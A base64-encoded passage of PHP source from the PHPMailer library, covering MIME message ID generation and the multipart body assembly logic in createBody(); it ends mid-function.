ZSBxdW90ZWQtcHJpbnRhYmxlIGFuZCBiYXNlNjQsIHdoaWNoIGFyZSBib3RoIDdiaXQgY29tcGF0aWJsZQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICR0aGlzLT5FbmNvZGluZyk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJucyB0aGUgd2hvbGUgTUlNRSBtZXNzYWdlLgogICAgICogSW5jbHVkZXMgY29tcGxldGUgaGVhZGVycyBhbmQgYm9keS4KICAgICAqIE9ubHkgdmFsaWQgcG9zdCBwcmVTZW5kKCkuCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OnByZVNlbmQoKQogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRTZW50TUlNRU1lc3NhZ2UoKQogICAgewogICAgICAgIHJldHVybiBzdGF0aWM6OnN0cmlwVHJhaWxpbmdXU1AoJHRoaXMtPk1JTUVIZWFkZXIgLiAkdGhpcy0+bWFpbEhlYWRlcikgLgogICAgICAgICAgICBzdGF0aWM6OiRMRSAuIHN0YXRpYzo6JExFIC4gJHRoaXMtPk1JTUVCb2R5OwogICAgfQoKICAgIC8qKgogICAgICogQ3JlYXRlIGEgdW5pcXVlIElEIHRvIHVzZSBmb3IgYm91bmRhcmllcy4KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2VuZXJhdGVJZCgpCiAgICB7CiAgICAgICAgJGxlbiA9IDMyOyAvLzMyIGJ5dGVzID0gMjU2IGJpdHMKICAgICAgICAkYnl0ZXMgPSAnJzsKICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdyYW5kb21fYnl0ZXMnKSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJGJ5dGVzID0gcmFuZG9tX2J5dGVzKCRsZW4pOwogICAgICAgICAgICB9IGNhdGNoIChcRXhjZXB0aW9uICRlKSB7CiAgICAgICAgICAgICAgICAvL0RvIG5vdGhpbmcKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ29wZW5zc2xfcmFuZG9tX3BzZXVkb19ieXRlcycpKSB7CiAgICAgICAgICAgIC8qKiBAbm9pbnNwZWN0aW9uIENyeXB0b2dyYXBoaWNhbGx5U2VjdXJlUmFuZG9tbmVzc0luc3BlY3Rpb24gKi8KICAgICAgICAgICAgJGJ5dGVzID0gb3BlbnNzbF9yYW5kb21fcHNldWRvX2J5dGVzKCRsZW4pOwogICAgICAgIH0KICAgICAgICBpZiAoJGJ5dGVzID09PSAnJykgewogICAgICAgICAgICAvL1dlIGZhaWxlZCB0byBwcm9kdWNlIGEgcHJvcGVyIHJhbmRvbSBzdHJpbmcsIHNvIG1ha2UgZG8uCiAgICAgICAgICAgIC8vVXNlIGEgaGFzaCB0byBmb3JjZSB0aGUgbGVuZ3RoIHRvIHRoZSBzYW1lIGFzIHRoZSBvdGhlciBtZXRob2RzCiAgICAgICAgICAgICRieXRlcyA9IGhhc2goJ3NoYTI1NicsIHVuaXFpZCgoc3RyaW5nKSBtdF9yYW5kKCksIHRydWUpLCB0cnVlKTsKICAgICAgICB9CgogICAgICAgIC8vV2UgZG9uJ3QgY2FyZSBhYm91dCBtZXNzaW5nIHVwIGJhc2U2NCBmb3JtYXQgaGVyZSwganVzdCB3YW50IGEgcmFuZG9tIHN0cmluZwogICAgICAgIHJldHVybiBzdHJfcmVwbGFjZShbJz0nLCAnKycsICcvJ10sICcnLCBiYXNlNjRfZW5jb2RlKGhhc2goJ3NoYTI1NicsICRieXRlcywgdHJ1ZSkpKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFzc2VtYmxlIHRoZSBtZXNzYWdlIGJvZHkuCiAgICAgKiBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcgVGhlIGFzc2VtYmxlZCBtZXNzYWdlIGJvZHkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNyZWF0ZUJvZHkoKQogICAgewogICAgICAgICRib2R5ID0gJyc7CiAgICAgICAgLy9DcmVhdGUgdW5pcXVlIElEcyBhbmQgcHJlc2V0IGJvdW5kYXJpZXMKICAgICAgICAkdGhpcy0+c2V0Qm91bmRhcmllcygpOwoKICAgICAgICBpZiAoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsKICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldE1haWxNSU1FKCkgLiBzdGF0aWM6OiRMRTsKICAgICAgICB9CgogICAgICAgICR0aGlzLT5zZXRXb3JkV3JhcCgpOwoKICAgICAgICAkYm9keUVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOwogICAgICAgICRib2R5Q2hhclNldCA9ICR0aGlzLT5DaGFyU2V0OwogICAgICAgIC8vQ2FuIHdlIGRvIGEgNy1iaXQgZG93bmdyYWRlPwogICAgICAgIGlmICgkdGhpcy0+VXNlU01UUFVURjgpIHsKICAgICAgICAgICAgJGJvZHlFbmNvZGluZyA9IHN0YXRpYzo6RU5DT0RJTkdfOEJJVDsKICAgICAgICB9IGVsc2VpZiAoc3RhdGljOjpFTkNPRElOR184QklUID09PSAkYm9keUVuY29kaW5nICYmICEkdGhpcy0+aGFzOGJpdENoYXJzKCR0aGlzLT5Cb2R5KSkgewogICAgICAgICAgICAkYm9keUVuY29kaW5nID0gc3RhdGljOjpFTkNPRElOR183QklUOwogICAgICAgICAgICAvL0FsbCBJU08gODg1OSwgV2luZG93cyBjb2RlcGFnZSBhbmQgVVRGLTggY2hhcnNldHMgYXJlIGFzY2lpIGNvbXBhdGlibGUgdXAgdG8gNy1iaXQKICAgICAgICAgICAgJGJvZHlDaGFyU2V0ID0gc3RhdGljOjpDSEFSU0VUX0FTQ0lJOwogICAgICAgIH0KICAgICAgICAvL0lmIGxpbmVzIGFyZSB0b28gbG9uZywgYW5kIHdlJ3JlIG5vdCBhbHJlYWR5IHVzaW5nIGFuIGVuY29kaW5nIHRoYXQgd2lsbCBzaG9ydGVuIHRoZW0sCiAgICAgICAgLy9jaGFuZ2UgdG8gcXVvdGVkLXByaW50YWJsZSB0cmFuc2ZlciBlbmNvZGluZyBmb3IgdGhlIGJvZHkgcGFydCBvbmx5CiAgICAgICAgaWYgKHN0YXRpYzo6RU5DT0RJTkdfQkFTRTY0ICE9PSAkdGhpcy0+RW5jb2RpbmcgJiYgc3RhdGljOjpoYXNMaW5lTG9uZ2VyVGhhbk1heCgkdGhpcy0+Qm9keSkpIHsKICAgICAgICAgICAgJGJvZHlFbmNvZGluZyA9IHN0YXRpYzo6RU5DT0RJTkdfUVVPVEVEX1BSSU5UQUJMRTsKICAgICAgICB9CgogICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7CiAgICAgICAgJGFsdEJvZHlDaGFyU2V0ID0gJHRoaXMtPkNoYXJTZXQ7CiAgICAgICAgLy9DYW4gd2UgZG8gYSA3LWJpdCBkb3duZ3JhZGU/CiAgICAgICAgaWYgKHN0YXRpYzo6RU5DT0RJTkdfOEJJVCA9PT0gJGFsdEJvZHlFbmNvZGluZyAmJiAhJHRoaXMtPmhhczhiaXRDaGFycygkdGhpcy0+QWx0Qm9keSkpIHsKICAgICAgICAgICAgJGFsdEJvZHlFbmNvZGluZyA9IHN0YXRpYzo6RU5DT0RJTkdfN0JJVDsKICAgICAgICAgICAgLy9BbGwgSVNPIDg4NTksIFdpbmRvd3MgY29kZXBhZ2UgYW5kIFVURi04IGNoYXJzZXRzIGFyZSBhc2NpaSBjb21wYXRpYmxlIHVwIHRvIDctYml0CiAgICAgICAgICAgICRhbHRCb2R5Q2hhclNldCA9IHN0YXRpYzo6Q0hBUlNFVF9BU0NJSTsKICAgICAgICB9CiAgICAgICAgLy9JZiBsaW5lcyBhcmUgdG9vIGxvbmcsIGFuZCB3ZSdyZSBub3QgYWxyZWFkeSB1c2luZyBhbiBlbmNvZGluZyB0aGF0IHdpbGwgc2hvcnRlbiB0aGVtLAogICAgICAgIC8vY2hhbmdlIHRvIHF1b3RlZC1wcmludGFibGUgdHJhbnNmZXIgZW5jb2RpbmcgZm9yIHRoZSBhbHQgYm9keSBwYXJ0IG9ubHkKICAgICAgICBpZiAoc3RhdGljOjpFTkNPRElOR19CQVNFNjQgIT09ICRhbHRCb2R5RW5jb2RpbmcgJiYgc3RhdGljOjpoYXNMaW5lTG9uZ2VyVGhhbk1heCgkdGhpcy0+QWx0Qm9keSkpIHsKICAgICAgICAgICAgJGFsdEJvZHlFbmNvZGluZyA9IHN0YXRpYzo6RU5DT0RJTkdfUVVPVEVEX1BSSU5UQUJMRTsKICAgICAgICB9CiAgICAgICAgLy9Vc2UgdGhpcyBhcyBhIHByZWFtYmxlIGluIGFsbCBtdWx0aXBhcnQgbWVzc2FnZSB0eXBlcwogICAgICAgICRtaW1lcHJlID0gJyc7CiAgICAgICAgc3dpdGNoICgkdGhpcy0+bWVzc2FnZV90eXBlKSB7CiAgICAgICAgICAgIGNhc2UgJ2lubGluZSc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYXR0YWNoJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49IHN0YXRpYzo6JExFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCBzdGF0aWM6OkNPTlRFTlRfVFlQRV9NVUxUSVBBUlRfUkVMQVRFRCAuICc7Jyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJyBib3VuZGFyeT0iJyAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCcgdHlwZT0iJyAuIHN0YXRpYzo6Q09OVEVOVF9UWVBFX1RFWFRfSFRNTCAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2F0dGFjaG1lbnQnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2FsdCc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMV0sCiAgICAgICAgICAgICAgICAgICAgJGFsdEJvZHlDaGFyU2V0LAogICAgICAgICAgICAgICAgICAgIHN0YXRpYzo6Q09OVEVOVF9UWVBFX1BMQUlOVEVYVCwKICAgICAgICAgICAgICAgICAgICAkYWx0Qm9keUVuY29kaW5nCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMV0sCiAgICAgICAgICAgICAgICAgICAgJGJvZHlDaGFyU2V0LAogICAgICAgICAgICAgICAgICAgIHN0YXRpYzo6Q09OVEVOVF9UWVBFX1RFWFRfSFRNTCwKICAgICAgICAgICAgICAgICAgICAkYm9keUVuY29kaW5nCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJHRoaXMtPkljYWwpKSB7CiAgICAgICAgICAgICAgICAgICAgJG1ldGhvZCA9IHN0YXRpYzo6SUNBTF9NRVRIT0RfUkVRVUVTVDsKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChzdGF0aWM6OiRJY2FsTWV0aG9kcyBhcyAkaW1ldGhvZCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3RyaXBvcygkdGhpcy0+SWNhbCwgJ01FVEhPRDonIC4gJGltZXRob2QpICE9PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ldGhvZCA9ICRpbWV0aG9kOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KAogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMV0sCiAgICAgICAgICAgICAgICAgICAgICAgICcnLAogICAgICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OkNPTlRFTlRfVFlQRV9URVhUX0NBTEVOREFSIC4gJzsgbWV0aG9kPScgLiAkbWV0aG9kLAogICAgICAgICAgICAgICAgICAgICAgICAnJwogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+SWNhbCwgJHRoaXMtPkVuY29kaW5nKTsKICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmUnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzFdLAogICAgICAgICAgICAgICAgICAgICRhbHRCb2R5Q2hhclNldCwKICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OkNPTlRFTlRfVFlQRV9QTEFJTlRFWFQsCiAgICAgICAgICAgICAgICAgICAgJGFsdEJvZHlFbmNvZGluZwogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgc3RhdGljOjpDT05URU5UX1RZUEVfTVVMVElQQVJUX1JFTEFURUQgLiAnOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCcgYm91bmRhcnk9IicgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIjsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnIHR5cGU9IicgLiBzdGF0aWM6OkNPTlRFTlRfVFlQRV9URVhUX0hUTUwgLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzJdLAogICAgICAgICAgICAgICAgICAgICRib2R5Q2hhclNldCwKICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OkNPTlRFTlRfVFlQRV9URVhUX0hUTUwsCiAgICAgICAgICAgICAgICAgICAgJGJvZHlFbmNvZGluZwogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbMl0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsIHN0YXRpYzo6Q09OVEVOVF9UWVBFX01VTFRJUEFSVF9BTFRFUk5BVElWRSAuICc7Jyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJyBib3VuZGFyeT0iJyAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMl0sCiAgICAgICAgICAgICAgICAgICAgJGFsdEJvZHlDaGFyU2V0LAogICAgICAgICAgICAgICAgICAgIHN0YXRpYzo6Q09OVEVOVF9UWVBFX1BMQUlOVEVYVCwKICAgICAgICAgICAgICAgICAgICAkYWx0Qm9keUVuY29kaW5nCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMl0sCiAgICAgICAgICAgICAgICAgICAgJGJvZHlDaGFyU2V0LAogICAgICAgICAgICAgICAgICAgIHN0YXRpYzo6Q09OVEVOVF9UWVBFX1RFWFRfSFRNTCwKICAgICAgICAgICAgICAgICAgICAkYm9keUVuY29kaW5nCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJHRoaXMtPkljYWwpKSB7CiAgICAgICAgICAgICAgICAgICAgJG1ldGhvZCA9IHN0YXRpYzo6SUNBTF9NRVRIT0RfUkVRVUVTVDsKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChzdGF0aWM6OiRJY2FsTWV0aG9kcyBhcyAkaW1ldGhvZCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3RyaXBvcygkdGhpcy0+SWNhbCwgJ01FVEhPRDonIC4gJGltZXRob2QpICE9PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ldGhvZCA9ICRpbWV0aG9kOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KAogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMl0sCiAgICAgICAgICAgICAgICAgICAgICAgICcnLAogICAgICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OkNPTlRFTlRfVFlQRV9URVhUX0NBTEVOREFSIC4gJzsgbWV0aG9kPScgLiAkbWV0aG9kLAogICAgICAgICAgICAgICAgICAgICAgICAnJwogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+SWNhbCwgJHRoaXMtPkVuY29kaW5nKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCBzdGF0aWM6OkNPTlRFTlRfVFlQRV9NVUxUSVBBUlRfQUxURVJOQVRJVkUgLiAnOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCcgYm91bmRhcnk9IicgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzJdLAogICAgICAgICAgICAgICAgICAgICRhbHRCb2R5Q2hhclNldCwKICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OkNPTlRFTlRfVFlQRV9QTEFJTlRFWFQsCiAgICAgICAgICAgICAgICAgICAgJGFsdEJvZHlFbmNvZGluZwogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgc3RhdGljOjpDT05URU5UX1RZUEVfTVVMVElQQVJUX1JFTEFURUQgLiAnOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCcgYm91bmRhcnk9IicgLiAkdGhpcy0+Ym91bmRhcnlbM10gLiAnIjsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnIHR5cGU9IicgLiBzdGF0aWM6OkNPTlRFTlRfVFlQRV9URVhUX0hUTUwgLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzNdLAogICAgICAgICAgICAgICAgICAgICRib2R5Q2hhclNldCwKICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OkNPTlRFTlRfVFlQRV9URVhUX0hUTUwsCiAgICAgICAgICAgICAgICAgICAgJGJvZHlFbmNvZGluZwogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbM10pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdKTsKICAgICAgICAgICAgICAgICRib2R5IC49IHN0YXRpYzo6JExFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIC8vQ2F0Y2ggY2FzZSAncGxhaW4nIGFuZCBjYXNlICcnLCBhcHBsaWVzIHRvIHNpbXBsZSBgdGV4dC9wbGFpbmAgYW5kIGB0ZXh0L2h0bWxgIGJvZHkgY29udGVudCB0eXBlcwogICAgICAgICAgICAgICAgLy9SZXNldCB0aGUgYEVuY29kaW5nYCBwcm9wZXJ0eSBpbiBjYXNlIHdlIGNoYW5nZWQgaXQgZm9yIGxpbmUgbGVuZ3RoIHJlYXNvbnMKICAgICAgICAgICAgICAgICR0aGlzLT5FbmNvZGluZyA9ICRib2R5RW5jb2Rpbmc7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb